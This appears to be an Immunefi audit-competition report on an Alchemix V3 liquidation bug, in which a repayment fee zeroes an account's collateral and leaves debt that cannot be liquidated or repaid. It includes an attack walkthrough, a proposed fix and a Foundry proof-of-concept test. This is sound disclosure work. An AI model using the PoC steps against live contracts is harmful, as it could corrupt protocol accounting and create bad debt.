# 58456 sc medium account can enter unliquidatable state with residual debt

**Submitted on Nov 2nd 2025 at 13:38:14 UTC by @gizzy for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #58456
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Protocol insolvency

## Description

## Summary

The liquidation flow in `AlchemistV3._liquidate()` has a critical flaw in its ordering of operations. After `_forceRepay()` repays earmarked debt and potentially brings an account back to healthy collateralization, the function deducts a repayment fee that can consume ALL remaining collateral. This leaves the account with residual debt but ZERO collateral, creating an unliquidatable state where the account cannot be liquidated again, repaid, or burned.

Additionally, if the user claims their redemption from the Transmuter, `totalSyntheticsIssued` drops to 0 while the account still has debt, breaking the protocol's core accounting invariant.

## Vulnerability Details

### Root Cause

In `AlchemistV3.sol:798-851`, the `_liquidate()` function follows this sequence:

1. **Line 828**: Call `_forceRepay()` to repay earmarked debt
2. **Line 831-835**: If debt is fully cleared (debt == 0), calculate and deduct repayment fee, then return
3. **Line 838-844**: Otherwise, recalculate collateralization ratio and check if liquidation is needed
4. **Line 845-850**: If ratio is now healthy (> `collateralizationLowerBound`), calculate and deduct repayment fee, then return

The bug occurs in step 4: The repayment fee is calculated based on the **full amount repaid by `_forceRepay()`**, but the collateralization check in step 3 does NOT account for this fee deduction.

### Repayment Fee Calculation

From `AlchemistV3.sol:909-916`:

```solidity
function _resolveRepaymentFee(uint256 accountId, uint256 repaidAmountInYield) internal returns (uint256 fee) {
    Account storage account = _accounts[accountId];
    // calculate repayment fee and deduct from account
    fee = repaidAmountInYield * repaymentFee / BPS;
    account.collateralBalance -= fee > account.collateralBalance ? account.collateralBalance : fee;
    emit RepaymentFee(accountId, repaidAmountInYield, msg.sender, fee);
    return fee;
}
```

**Key Issue**: If `fee > account.collateralBalance`, the entire remaining collateral is wiped to 0, while still with debt .

### Step-by-Step Attack Vector

#### Initial Setup

* **Alice**: Deposits 1,000 MYT shares worth $1,000 USD
* **Bob**: Deposits 1,000 MYT shares worth $1,000 USD (provides liquidity, doesn't borrow)
* **Alice**: Mints maximum debt = $900 (90% LTV at 110% minimum collateralization)
* **Alice**: Creates redemption in Transmuter with all 900 alTokens

#### Attack Execution

**Step 1: Wait for Full Transmutation**

* Time passes: (5,256,000 blocks)
* Earmarked debt decays to ≈$899 due to rounding

**Step 2: Price Crash**

* MYT price drops 9.5%
* Alice's collateral value: 1,000 shares × $0.905 = **$905**
* Alice's debt: **$900**
* Alice's earmarked: **$899**
* Collateralization ratio: $905 / $900 = **100.5%** (below 105% `collateralizationLowerBound`)

**Step 3: Liquidator Calls `liquidate(aliceTokenId)`**

The function executes as follows:

```solidity
// Line 817-823: Calculate initial ratio
collateralInUnderlying = $905
collateralizationRatio = ($905 * 1e18) / $900 = 1.005555... × 10^18 = 100.5%

// Line 821-823: Check if healthy - FALSE (100.5% < 105%)
if (collateralizationRatio > collateralizationLowerBound) {
    return (0, 0, 0); // NOT TAKEN
}

// Line 826-829: Repay earmarked debt
repaidAmountInYield = _forceRepay(accountId, $899)
// _forceRepay converts $899 debt to ≈899 MYT shares and deducts from collateral
// Alice's collateral after: 905 - 900 = 5
// Alice's debt after: 900 - 899 = 1

// Line 831-835: Check if debt fully cleared - FALSE (Alice still has $1 debt)
if (account.debt == 0) {
    // NOT TAKEN
}

// Line 838-840: Recalculate ratio after repayment
collateralInUnderlying = $5  
collateralizationRatio = ($5 * 1e18) / $1  = 500%

// Line 842-850: Check if healthy after repayment - TRUE (500%% > 105%)
if (collateralizationRatio > collateralizationLowerBound) {
    // Calculate repayment fee based on FULL $899 repaid amount
    feeInYield = _resolveRepaymentFee(accountId, 899 shares);
    // repaymentFee = 300 BPS (3%)
    // fee = 899 shares × 3% = 26.97 shares ≈ $24.41
    // so fees will be clamped to colleteral $5 and zeroing the colleteral amount
    
}
```

this makes

1. **Cannot liquidate again**: `liquidate()` reverts with `LiquidationError()` because:
   * `collateralInUnderlying = 0`
   * `collateralizationRatio = 0 / debt = 0%`
   * Check passes (0% < 105%), proceeds to repay
   * `_forceRepay()` tries to repay but `account.earmarked = 0`, returns 0
   * `debt` is still > 0, so continues to `_doLiquidation()`
   * `calculateLiquidation()` returns `liquidationAmount = 0` (no collateral to seize)
   * Function returns `(0, 0, 0)` which triggers revert at line 556
2. **Cannot burn/repay**: If Alice tries to burn alTokens to repay the debt:

   ```solidity
   alchemist.burn($0.0001712, tokenId)
   //revert because brun amount is greated than totalSyntheticsIssued
   ```
3. **Protocol accounting breaks**: If Alice claims her Transmuter redemption:
   * Transmuter calls `alchemist.redeem(899 alTokens)`
   * This burns 900 alTokens from circulation
   * `totalSyntheticsIssued -= 900` → becomes **0**
   * BUT Alice's account still has debt
   * **Broken invariant**: `totalDebt > totalSyntheticsIssued` (debt exists with 0 synthetics in circulation)

## Impact

**Denial of Service (DOS)**

* Account becomes permanently unliquidatable,cant burn and repay. **Protocol Accounting Corruption**
* `totalDebt` > `totalSyntheticsIssued` breaks core invariant
* Functions relying on this invariant may malfunction `_earmark()` could enter undefined behavior

**Bad Debt Accumulation**

* Residual debt becomes uncollectable "ghost debt"
* Scales across multiple users during market volatility

### Likelihood

**High** - This occurs in common scenarios:

* Any price drop of 5-15% for high-LTV positions
* Repayment fee > 1% (default is 3%, making it very likely)

\##Reference

<https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/AlchemistV3.sol#L818C7-L842C10>

## Recommended Fix

### Solution: Deduct Repayment Fee BEFORE Health Check

**File: `src/AlchemistV3.sol:798-851`**

Modify the `_liquidate()` function to deduct the repayment fee immediately after `_forceRepay()`, then perform the health check on the adjusted collateral balance.

```solidity
function _liquidate(uint256 accountId) internal returns (uint256 amountLiquidated, uint256 feeInYield, uint256 feeInUnderlying) {
    // Query transmuter and earmark global debt
    _earmark();
    // Sync current user debt before deciding how much needs to be liquidated
    _sync(accountId);

    Account storage account = _accounts[accountId];

    // Early return if no debt exists
    if (account.debt == 0) {
        return (0, 0, 0);
    }

    // In the rare scenario where 1 share is worth 0 underlying asset
    if (IVaultV2(myt).convertToAssets(1e18) == 0) {
        return (0, 0, 0);
    }

    // Calculate initial collateralization ratio
    uint256 collateralInUnderlying = totalValue(accountId);
    uint256 collateralizationRatio = collateralInUnderlying * FIXED_POINT_SCALAR / account.debt;

    // If account is healthy, nothing to liquidate
    if (collateralizationRatio > collateralizationLowerBound) {
        return (0, 0, 0);
    }

    // Try to repay earmarked debt if it exists
    uint256 repaidAmountInYield = 0;
    if (account.earmarked > 0) {
        repaidAmountInYield = _forceRepay(accountId, account.earmarked);
    }
    
    // ============================================
    // FIX: Deduct repayment fee BEFORE health check
    // ============================================
    if (repaidAmountInYield > 0) {
        feeInYield = repaidAmountInYield * repaymentFee / BPS;
        // Cap fee to available collateral and deduct immediately
        uint256 feeToDeduct = feeInYield > account.collateralBalance ? account.collateralBalance : feeInYield;
        account.collateralBalance -= feeToDeduct;
        feeInYield = feeToDeduct; // Update actual fee charged
        emit RepaymentFee(accountId, repaidAmountInYield, msg.sender, feeInYield);
    }
    
    // If debt is fully cleared, return with only the repaid amount
    if (account.debt == 0) {
        if (feeInYield > 0) {
            TokenUtils.safeTransfer(myt, msg.sender, feeInYield);
        }
        return (repaidAmountInYield, feeInYield, 0);
    }

    // Recalculate ratio after repayment AND fee deduction
    collateralInUnderlying = totalValue(accountId);
    collateralizationRatio = collateralInUnderlying * FIXED_POINT_SCALAR / account.debt;

    if (collateralizationRatio <= collateralizationLowerBound) {
        // Do actual liquidation (fee already deducted, pass 0 for repaid amount)
        (uint256 liquidationAmount, uint256 liquidationFee, uint256 underlyingFee) = 
            _doLiquidation(accountId, collateralInUnderlying, 0);
        
        // Send repayment fee to liquidator
        if (feeInYield > 0) {
            TokenUtils.safeTransfer(myt, msg.sender, feeInYield);
        }
        
        return (liquidationAmount + repaidAmountInYield, liquidationFee + feeInYield, underlyingFee);
    } else {
        // Repayment restored health, send fee and return
        if (feeInYield > 0) {
            TokenUtils.safeTransfer(myt, msg.sender, feeInYield);
        }
        return (repaidAmountInYield, feeInYield, 0);
    }
}
```

## Proof of Concept

## Proof of Concept

Add this test to `src/test/AlchemistV3.t.sol` (<https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/test/AlchemistV3.t.sol>):

```solidity
    function testPOC_AccountCanEndUpInUnliquidatableState() external {
        console.log("\n=== POC: UnLiqudatable Account Test ===\n");
        vm.prank(alOwner);
        alchemist.setProtocolFee(protocolFee);

        uint256 depositAmount = 1000e18; //981920193698630136722

        // Step 1:  deposits and borrows maximum debt
        vm.startPrank(address(0xbeef));
        SafeERC20.safeApprove(address(vault), address(alchemist), depositAmount);
        //vault.transfer(address(alchemist), 600);
        alchemist.deposit(depositAmount, address(0xbeef), 0);
        uint256 tokenIdAttacker = AlchemistNFTHelper.getFirstTokenId(address(0xbeef), address(alchemistNFT));

        // Borrow maximum (collateral / minimumCollateralization)
        uint256 maxBorrowable = alchemist.getMaxBorrowable(tokenIdAttacker);
        alchemist.mint(tokenIdAttacker, maxBorrowable, address(0xbeef));

        console.log("Step 1: Initial Position");
        console.log("  Collateral:", depositAmount);
        console.log("  Debt borrowed:", maxBorrowable);
        console.log("  Initial collateralization:", depositAmount * FIXED_POINT_SCALAR / maxBorrowable / 1e16, "%");
        console.log("  Collateral value (underlying):", alchemist.totalValue(tokenIdAttacker));
        vm.stopPrank();

        vm.startPrank(anotherExternalUser);
        SafeERC20.safeApprove(address(vault), address(alchemist), depositAmount);
        alchemist.deposit(depositAmount, anotherExternalUser, 0);
        vm.stopPrank();

        // Step 2: Attacker creates redemption with ALL borrowed debt
        vm.startPrank(address(0xbeef));
        SafeERC20.safeApprove(address(alToken), address(transmuterLogic), maxBorrowable);
        transmuterLogic.createRedemption(maxBorrowable);
        console.log("\nStep 2:  creates redemption");
        vm.stopPrank();

        vm.roll(block.number + 1);
        alchemist.poke(tokenIdAttacker);

        // Step 3: Advance time to mature redemption (100% maturity)
        vm.roll(block.number + 5_256_000);
        console.log("\nStep 3: Fast forward to full maturity (2 years)");

        // Step 4: Simulate 10% price crash
        console.log("\nStep 4: PRICE CRASH - MYT drops 10%");
        // Increase mocked supply 10x = price drops to 10% of original
        uint256 initialVaultSupply = IERC20(address(mockStrategyYieldToken)).totalSupply();
        IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(initialVaultSupply);
        // increasing yeild token suppy by 1000 bps or 10%  while keeping the unederlying supply unchanged
        uint256 modifiedVaultSupply = (initialVaultSupply * 1000 / 10_000) + initialVaultSupply;
        IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(modifiedVaultSupply);

        (uint256 collateralBefore, uint256 debtBefore, uint256 earmarkedBefore) = alchemist.getCDP(tokenIdAttacker);
        console.log("\nPosition after price crash:");
        console.log("  Collateral (shares):", collateralBefore);
        console.log("  Collateral value (underlying):", alchemist.totalValue(tokenIdAttacker));
        console.log("  Debt:", debtBefore);
        console.log("  Earmarked:", earmarkedBefore);
        uint256 collateralizationAfterCrash = alchemist.totalValue(tokenIdAttacker) * FIXED_POINT_SCALAR / debtBefore;
        console.log("  Collateralization ratio:", collateralizationAfterCrash / 1e16, "%");

        alchemist.liquidate(tokenIdAttacker);

        (collateralBefore, debtBefore, earmarkedBefore) = alchemist.getCDP(tokenIdAttacker);
        console.log("\nPosition after liquidation crash:");
        console.log("  Collateral (shares):", collateralBefore);
        console.log("  Collateral value (underlying):", alchemist.totalValue(tokenIdAttacker));
        console.log("  Debt:", debtBefore);
        console.log("  Earmarked:", earmarkedBefore);

        // Step 5:  try to liquadate the account second time as it has zero colatteral to backd debt.
        console.log("\nStep 5:  liquidatiing the second time");
        vm.expectRevert();
        alchemist.liquidate(tokenIdAttacker);

        vm.startPrank(address(0xbeef));

        console.log("Try repay by burning also revert");
        deal(address(alToken), address(0xbeef), debtBefore);
        SafeERC20.safeApprove(address(alToken), address(alchemist), debtBefore);
        vm.expectRevert();
        alchemist.burn(debtBefore, tokenIdAttacker);

        vm.stopPrank();

        (collateralBefore, debtBefore, earmarkedBefore) = alchemist.getCDP(tokenIdAttacker);
        console.log("\nPosition after Second liquidation crash:");
        console.log("  Collateral (shares):", collateralBefore);
        console.log("  Collateral value (underlying):", alchemist.totalValue(tokenIdAttacker));
        console.log("  Debt:", debtBefore);
        console.log("  Earmarked:", earmarkedBefore);
    }
```

### Expected Output

```
=== POC: Unliquidatable Account Test ===

Step 1: Alice's Initial Position
  Collateral: 1000 shares
  Debt borrowed: 900 alTokens
  Collateral value: 1000 USD
  Collateralization: 111 %

Step 2: Alice creates redemption for 900 alTokens

Step 3: Fast forward to full maturity (2 years)

Step 4: PRICE CRASH - MYT drops 10%

Alice's Position After Price Crash:
  Collateral (shares): 1000
  Collateral value (USD): 909
  Debt: 900
  Earmarked: 899
  Collateralization ratio: 101 %
  Is undercollateralized: true

Step 5: Liquidator liquidates Alice's account

Alice's Position After Liquidation:
  Collateral (shares): 0
  Collateral value (USD): 0
  Debt: 171232876712327
  Earmarked: 0
```
